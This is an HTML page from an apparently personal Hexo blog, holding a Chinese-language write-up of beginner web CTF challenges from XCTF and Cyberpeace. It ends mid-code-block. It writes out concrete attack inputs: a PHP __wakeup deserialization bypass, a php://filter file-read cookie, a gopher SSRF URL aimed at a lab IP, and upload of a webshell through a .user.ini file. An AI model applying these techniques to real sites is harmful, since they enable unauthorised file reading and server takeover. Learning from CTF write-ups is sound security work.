@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>WRITEUP | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CAT&#x2F;XCTF 4th-WHCTF-2017(4)writeup最开始看到这熟悉的界面，还以为是简单的命令注入，输入127.0.0.1发现的确是ping命令，但是当输入127.0.0.1 &amp; dir的时候报错，显示Invalid URL。然后就懵逼了，毫无下手之地。查看大佬们的writeup之后发现，可以使用宽字符注入，即url&#x3D;%df，然后他就会爆出html代码，把代码复制打">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WRITEUP">
+<meta property="og:url" content="http://example.com/2022/08/30/WRITEUP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CAT&#x2F;XCTF 4th-WHCTF-2017(4)writeup最开始看到这熟悉的界面，还以为是简单的命令注入，输入127.0.0.1发现的确是ping命令，但是当输入127.0.0.1 &amp; dir的时候报错，显示Invalid URL。然后就懵逼了，毫无下手之地。查看大佬们的writeup之后发现，可以使用宽字符注入，即url&#x3D;%df，然后他就会爆出html代码，把代码复制打">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/32794d1fbf7a4d5fa3807a4b943b2c89.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/98e09c135f234a44a70fec8f1db7c094.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f203f026631b4bf6b8dbf869970dca7b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/adfc5a5c6e96428dbfa68ce0df702a06.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c8804b9ef0d3464e93b9004c80c18aaf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9a1916437f544bfbbbb4c06b2e7215bc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/40366e096b32463bba7d09d4d821d9cf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b658f9640764436888232d139902424a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b0028b67a9864f8399566c57fb7118bf.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a49504cfeb64446b8b745e3d36a16904.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9cdf3d06a28f4523b413b02591a83b24.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d1f631048fce4688a5c3ae62844a825c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/15a204b429e141ae90e92c9b0d241f36.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/308edda2d480475e9326799a4a93287b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e029a1a201014975b0a3477ee2cc5983.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/efd1e0f22b964a19b02242164c558e1f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/06d915f2ec264647a03b7b702ea168d1.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/70400023b924450d9646f23c31af199e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6451989056424d63bbffa2d9341321d3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/52b5cb00ae2347b1bafd9abbcc760dbb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ce4b966849e540499a4a972b1c2ed1a4.png">
+<meta property="article:published_time" content="2022-08-30T03:20:57.000Z">
+<meta property="article:modified_time" content="2022-08-30T03:21:07.526Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/32794d1fbf7a4d5fa3807a4b943b2c89.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-WRITEUP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/30/WRITEUP/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T03:20:57.000Z" itemprop="datePublished">2022-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      WRITEUP
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CAT-x2F-XCTF-4th-WHCTF-2017-4"><a href="#CAT-x2F-XCTF-4th-WHCTF-2017-4" class="headerlink" title="CAT&#x2F;XCTF 4th-WHCTF-2017(4)"></a>CAT&#x2F;XCTF 4th-WHCTF-2017(4)</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11572267.html">writeup</a><br>最开始看到这熟悉的界面，还以为是简单的命令注入，输入<code>127.0.0.1</code>发现的确是ping命令，但是当输入<code>127.0.0.1 &amp; dir</code>的时候报错，显示Invalid URL。然后就懵逼了，毫无下手之地。<br>查看大佬们的writeup之后发现，可以使用宽字符注入，即<code>url=%df</code>，然后他就会爆出html代码，把代码复制打开，就是报错原因和相关信息。<br>(django报错页面，将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。)<br><img src="https://img-blog.csdnimg.cn/32794d1fbf7a4d5fa3807a4b943b2c89.png" alt="在这里插入图片描述"><br>在这里可以看到pyhton path，第一行就是项目路径。<br><img src="https://img-blog.csdnimg.cn/98e09c135f234a44a70fec8f1db7c094.png" alt="在这里插入图片描述"><br>这里没看懂，不过大概意思是可以使用<code>@</code>读取文件内容<br>这里前面还有一个字典fuzz的操作，@没有被过滤<br><img src="https://img-blog.csdnimg.cn/f203f026631b4bf6b8dbf869970dca7b.png" alt="在这里插入图片描述"></p>
+<p>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。<br>django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。即<code>/opt/api/api/settings.py</code><br>打开<code>url=@/opt/api/api/settings.py</code>也出现了一段html代码，复制打开可以看到<code>Name：/opt/api/database.sqlite3</code><br><img src="https://img-blog.csdnimg.cn/adfc5a5c6e96428dbfa68ce0df702a06.png" alt="在这里插入图片描述"><br>直接打开<code>url=@/opt/api/database.sqlite3</code>，直接搜索flag或ctf<br>搜索ctf获得结果<code>WHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p>
+<h1 id="Training-WWW-Robots-1"><a href="#Training-WWW-Robots-1" class="headerlink" title="Training-WWW-Robots(1)"></a>Training-WWW-Robots(1)</h1><p>这是一个学习robots文件的题，直接在网址后加<code>/robots.txt</code>或者使用<a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/robots/">站长工具</a>进行robots检测。可以看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fl0g.php</span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/c8804b9ef0d3464e93b9004c80c18aaf.png" alt="在这里插入图片描述"><br>那就直接打开<code>/fl0g.php</code>，就能看到flag<br><code>cyberpeace&#123;b03432652f32469133918d7f56ca2cf1&#125;</code></p>
+<h1 id="PHP2-1"><a href="#PHP2-1" class="headerlink" title="PHP2(1)"></a>PHP2(1)</h1><p>你能登录这个网站吗？<br>没有思路，can can need<br>看了writeup才发现我忘了可以进行后台地址爆破<br>使用御剑或者dirsearch<br>(因为题目提示了php，那就只选php就行)<br><img src="https://img-blog.csdnimg.cn/9a1916437f544bfbbbb4c06b2e7215bc.png" alt="在这里插入图片描述"><br>dirsearch -u URL<br><img src="https://img-blog.csdnimg.cn/40366e096b32463bba7d09d4d821d9cf.png" alt="在这里插入图片描述"><br>这两个死活没用，看了一下，人家能爆出来<code>index.phps</code>？原来是自己加的。。<br>打开出现下述代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>两次比较，第一次是<code>===</code><br>全等于操作过程如下：<br>1.判断全等于操作符2边的数据类型是否相同 如果不相同，则返回false<br>2.判断全等于操作符2边的值是否相等，如果 不相等，则返回false<br>3.最后将上面2步的操作进行与操作。返回与操作的结果。<br>第二次是<code>==</code>，只比较值（强制进行数据类型转换）</p>
+<p>所以我们传入的必须是经过两次url编码（get也会解码）后的<code>admin</code>（任意数量字符），比如传入<code>admin</code>-&gt;<code>%61dmin</code>-&gt;<code>%2561dmin</code>（这里需要传入的地址可以是根目录或者&#x2F;index.php，但是不能是&#x2F;index.phps，因为它只是源码）</p>
+<p>urlencode将需要转码的字符转为16进制，然后从右到左，取4位(不足4位直接处理)，每2位做一位，前面加上%，编码成%XY格式。<br>但是这里直接使用在线工具对admin编码是不可以的，因为它不会对字符和数字进行编码，我们需要直接转成16进制，然后加上%<br><a target="_blank" rel="noopener" href="http://www.ku51.net/ox2str/">字符转16进制</a></p>
+<p>然后就能看到flag<code>cyberpeace&#123;2babf104e185faee3b5700e452be462d&#125;</code></p>
+<h1 id="unserialize3-1"><a href="#unserialize3-1" class="headerlink" title="unserialize3(1)"></a>unserialize3(1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//这里本来题目没有大括号</span></span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>?code=</code>我猜到应该是用get传参，其它就不会了<br>看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/102664372">大佬的writeup</a>大概的思路是把xctf这个类序列化后的结果用get传过去，同时还要跳过__wakeup()函数</p>
+<p>__wakeup()，执行unserialize()时，先会调用这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">	<span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$peak</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();<span class="comment">//使用new运算符来实例化该类（xctf）的对象为peak</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$peak</span>));<span class="comment">//输出被序列化的对象（peak）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>序列化的结果是<br><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>大概的意思是长度4的object xctf包含一个只有1个参数的数组<br>里面有一个长度4的string flag的值为长度3的string 111</p>
+<p>那要怎样才能跳过__wakeup()函数呢？</p>
+<p>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
+<p>将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即<br><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>然后用上面说的get方式访问，就能看到flag<br><code>cyberpeace&#123;dc66a5c3f1fa0cb3bd5517df3fa8dc8c&#125;</code></p>
+<h1 id="ics-06-x2F-XCTF-4th-CyberEarth-1"><a href="#ics-06-x2F-XCTF-4th-CyberEarth-1" class="headerlink" title="ics-06&#x2F;XCTF 4th-CyberEarth(1)"></a>ics-06&#x2F;XCTF 4th-CyberEarth(1)</h1><p>点开是一个恢弘的界面（贴图）<br><img src="https://img-blog.csdnimg.cn/b658f9640764436888232d139902424a.png" alt="在这里插入图片描述"><br>看到这么多选项，我是没想着一个个试着点的，但是论快捷还是一个个点。<br>也可以查看元素搜href，不过还是点方便。<br>点击报表中心会转到另一个界面，让你选日期玩，不过怎么选都没用<br>不过可以注意到url有一个get传参。<br>尝试使用sql注入好像不太行，看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107946683">别人的writeup</a>才知道要爆破。。（这是我没想到的）<br>这里burpsuite中payload type要选择Numbers，设置从1到5000，step为1<br>当id为2333时长度不一样<br>在response可以看到flag<code>cyberpeace&#123;53736b5e0bffa8fa26d2b5987f74fa52&#125;</code></p>
+<h1 id="view-source-x2F-Cyberpeace-n3k0-1"><a href="#view-source-x2F-Cyberpeace-n3k0-1" class="headerlink" title="view_source&#x2F;Cyberpeace-n3k0(1)"></a>view_source&#x2F;Cyberpeace-n3k0(1)</h1><p>这里好像鼠标右键被禁用了，但是很少用右键打开检查。。<br>ctrl+u查看源码或者F12查看元素，得到<br>flag<code>cyberpeace&#123;41e995b7ee379f3bd0eedc31a829dee9&#125;</code></p>
+<h1 id="get-post-x2F-Cyberpeace-n3k0-1"><a href="#get-post-x2F-Cyberpeace-n3k0-1" class="headerlink" title="get_post&#x2F;Cyberpeace-n3k0(1)"></a>get_post&#x2F;Cyberpeace-n3k0(1)</h1><p>这里跟着它的要求先get提交a&#x3D;1，然后post提交b&#x3D;2就能获得flag<br>这里post可以用HackBar插件，当然抓包在下面添加post也行<br><code>cyberpeace&#123;8e329e962b4c0ce9dd4149dca6a6e733&#125;</code></p>
+<h1 id="robots-x2F-Cyberpeace-n3k0-1"><a href="#robots-x2F-Cyberpeace-n3k0-1" class="headerlink" title="robots&#x2F;Cyberpeace-n3k0(1)"></a>robots&#x2F;Cyberpeace-n3k0(1)</h1><p>访问<code>/robots.txt</code>可以看到<br><img src="https://img-blog.csdnimg.cn/b0028b67a9864f8399566c57fb7118bf.png" alt="在这里插入图片描述"><br>这里的Disallow参数代表禁止遵守robots规则的搜索引擎爬取<br>直接访问，可以获得flag<br><code>cyberpeace&#123;49643cd3a8ce8917ff5c2f0a022f198a&#125;</code></p>
+<h1 id="backup-x2F-Cyberpeace-n3k0-1"><a href="#backup-x2F-Cyberpeace-n3k0-1" class="headerlink" title="backup&#x2F;Cyberpeace-n3k0(1)"></a>backup&#x2F;Cyberpeace-n3k0(1)</h1><p>访问<code>/index.php</code>没反应<br>常见的备份文件后缀名：</p>
+<pre><code>.bak
+.git
+.svn
+.swp
+.~
+.bash_history
+.bkf
+</code></pre>
+<p>因为题目名是backup，所以后缀名有可能是bak<br>使用dirsearch试一下<br><img src="https://img-blog.csdnimg.cn/a49504cfeb64446b8b745e3d36a16904.png" alt="在这里插入图片描述"><br>访问<code>/index.php.bak</code>，会下载一个<code>index.php.bak</code>文件，记事本打开得到flag<br><code>Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</code></p>
+<h1 id="cookie-x2F-Cyberpeace-n3k0-1"><a href="#cookie-x2F-Cyberpeace-n3k0-1" class="headerlink" title="cookie&#x2F;Cyberpeace-n3k0(1)"></a>cookie&#x2F;Cyberpeace-n3k0(1)</h1><p><img src="https://img-blog.csdnimg.cn/9cdf3d06a28f4523b413b02591a83b24.png" alt="在这里插入图片描述"><br>访问<code>/cookie.php</code>，提示<code>See the http response</code><br>在响应标头里可以看到flag<br><img src="https://img-blog.csdnimg.cn/d1f631048fce4688a5c3ae62844a825c.png" alt="在这里插入图片描述"><br><code>cyberpeace&#123;8d6cfbe3f601cd12e4e2c6f1b0807c11&#125;</code></p>
+<h1 id="disabled-button-x2F-Cyberpeace-n3k0-1"><a href="#disabled-button-x2F-Cyberpeace-n3k0-1" class="headerlink" title="disabled_button&#x2F;Cyberpeace-n3k0(1)"></a>disabled_button&#x2F;Cyberpeace-n3k0(1)</h1><p><img src="https://img-blog.csdnimg.cn/15a204b429e141ae90e92c9b0d241f36.png" alt="在这里插入图片描述"><br>去掉disable，点击获得flag<br>或者可以post传<code>auth=flag</code><br><code>cyberpeace&#123;ce6972b365ff4502f2c0928f9d833569&#125;</code></p>
+<h1 id="weak-auth-x2F-Cyberpeace-n3k0-1"><a href="#weak-auth-x2F-Cyberpeace-n3k0-1" class="headerlink" title="weak_auth&#x2F;Cyberpeace-n3k0(1)"></a>weak_auth&#x2F;Cyberpeace-n3k0(1)</h1><p>随便输了个<code>admin</code>，<code>password</code>试了一下，提示<br><img src="https://img-blog.csdnimg.cn/308edda2d480475e9326799a4a93287b.png" alt="在这里插入图片描述"><br>又随便输了个<code>1</code>，<code>1</code>试了下，提示<code>please login as admin</code><br>那就只用爆破密码就行<br>把top1w导入，本来以为很久，结果第一个就出了<br><img src="https://img-blog.csdnimg.cn/e029a1a201014975b0a3477ee2cc5983.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/efd1e0f22b964a19b02242164c558e1f.png" alt="在这里插入图片描述"><br>获得flag<code>cyberpeace&#123;80b17eb4a68b7fcff023f3f9b8e7c371&#125;</code></p>
+<h1 id="simple-php-x2F-Cyberpeace-n3k0-1"><a href="#simple-php-x2F-Cyberpeace-n3k0-1" class="headerlink" title="simple_php&#x2F;Cyberpeace-n3k0(1)"></a>simple_php&#x2F;Cyberpeace-n3k0(1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php中有两种比较符号</p>
+<blockquote>
+<p>&#x3D;&#x3D;&#x3D; 会同时比较字符串的值和类型<br>&#x3D;&#x3D; 会先将字符串换成相同类型，再作比较，属于弱类型比较</p>
+</blockquote>
+<p>get传入a和b<br>is_numeric() 函数用于检测变量是否为数字或数字字符串<br>要求a&#x3D;&#x3D;0且a不为空，a&#x3D;”0”或者a&#x3D;0a或者a&#x3D;任意字符串<br>要求b不为数字或数字字符串且大于1234，传入b&#x3D;1235a<br>所以传入<code>?a=0a&amp;b=1235a</code>就能获得完整flag<br><code>Cyberpeace&#123;647E37C7627CC3E4019EC69324F66C7C&#125;</code></p>
+<h1 id="baby-web-1"><a href="#baby-web-1" class="headerlink" title="baby_web(1)"></a>baby_web(1)</h1><p>dirsearch发现如下<br><img src="https://img-blog.csdnimg.cn/06d915f2ec264647a03b7b702ea168d1.png" alt="在这里插入图片描述"><br>访问<code>index.php</code>会重定向到1.php，这里没有思路了。<br>看writeup发现需要使用burpsuite抓包<br>当它重定向时，send to repeater，修改GET &#x2F;index.php，send<br>提示Flag is hidden!<br>在Hex中可以看到flag<br>或者直接浏览器访问<code>/index.php</code>，在响应标头可以看到flag<br><code>flag&#123;very_baby_web&#125;</code></p>
+<h1 id="inget-x2F-宜兴网信办-1"><a href="#inget-x2F-宜兴网信办-1" class="headerlink" title="inget&#x2F;宜兴网信办(1)"></a>inget&#x2F;宜兴网信办(1)</h1><p>擦，看题目抓不着头脑，结果看writeup说这是一个SQL注入的题<br>查了下inget，<code>投入；输入；输入过程</code>，okok（我看提示bypass想歪了）<br>bypass<code>绕过; 避开</code><br>使用sqlmap得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code></p>
+<h1 id="easyupload-x2F-CTF-1"><a href="#easyupload-x2F-CTF-1" class="headerlink" title="easyupload&#x2F;CTF(1)"></a>easyupload&#x2F;CTF(1)</h1><p>看名字就知道，上传一句话木马，但是提示<code>Your file looks wicked</code><br>上传正常图片可以，那就上传图片马<br>但是上传图片马也失败了<br>看了一下writeup，发现内容不能包含php，所以需要用短标签<br>可以使用图片马或者php前加<code>GIF89a</code><br><img src="https://img-blog.csdnimg.cn/70400023b924450d9646f23c31af199e.png" alt="在这里插入图片描述"><br>还需要上传<code>.user.ini</code>文件，上传时抓包修改<code>Content-Type: image/gif</code><br><img src="https://img-blog.csdnimg.cn/6451989056424d63bbffa2d9341321d3.png" alt="在这里插入图片描述"><br>通过.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br>提交后会显示路径，访问<code>/uploads/index.php</code><br><strong>但是它怎么知道这个目录下有php文件呢？</strong><br>这里需要访问的是index.php，通过<code>.user.ini</code>配置让它包含1.png<br>在蚁剑中可以看到flag在根目录<br><code>cyberpeace&#123;9aac6bc58d51e4ee318aee88578bd973&#125;</code></p>
+<h1 id="fileinclude-x2F-宜兴网信办-1"><a href="#fileinclude-x2F-宜兴网信办-1" class="headerlink" title="fileinclude&#x2F;宜兴网信办(1)"></a>fileinclude&#x2F;宜兴网信办(1)</h1><p>提示<br><img src="https://img-blog.csdnimg.cn/52b5cb00ae2347b1bafd9abbcc760dbb.png" alt="在这里插入图片描述"><br>@include表示包含并运行指定文件的内容<br>file_get_contents() 把整个文件读入一个字符串中。</p>
+<p>用hackbar传一个cookie：language&#x3D;chinese，提示变化<br>传flag的话，界面变为空白<br>看了下writeup，需要传入的cookie为：<br><code>Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p>
+<blockquote>
+<p>php:&#x2F;&#x2F;filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
+</blockquote>
+<p>然后能看到经base64加密后的字符串<br><code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNlezhhMzllNTc1N2U4ZDAzNTQyZjVlMzRlZjY1YzE1Nzk3fSI7DQo/Pg==</code><br>解密后获得flag<br><code>cyberpeace&#123;8a39e5757e8d03542f5e34ef65c15797&#125;</code></p>
+<h1 id="very-easy-sql-x2F-CTF-1"><a href="#very-easy-sql-x2F-CTF-1" class="headerlink" title="*very_easy_sql&#x2F;CTF(1)"></a>*very_easy_sql&#x2F;CTF(1)</h1><p>点一下submit，发现它根本没有跳转，查看元素，发现果然是假表单<br><img src="https://img-blog.csdnimg.cn/ce4b966849e540499a4a972b1c2ed1a4.png" alt="在这里插入图片描述"><br>提示use.php，那就让访问<code>use.php“</code><br>提示<code>url you want to curl</code></p>
+<blockquote>
+<p>cURL是一个利用URL语法在命令行下工作的文件传输工具</p>
+</blockquote>
+<p>输入flag好像没反应，看了一眼url，这不会也是sql注入吧<br>sqlmap level1好像不行<br>看了眼writeup，这是一个ssrf题，知识盲区。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60115503/article/details/124407499">gopher协议</a><br>在kali的终端执行<br><code>http://61.147.171.105:56667/use.php?url=gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20PHPSESSID%3D1f546328759632456215236845122365%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3Dadmin</code></p>
+<p>说实话，官方writeup没看懂。</p>
+<h1 id="fileclude-x2F-CTF-1"><a href="#fileclude-x2F-CTF-1" class="headerlink" title="fileclude&#x2F;CTF(1)"></a>fileclude&#x2F;CTF(1)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span 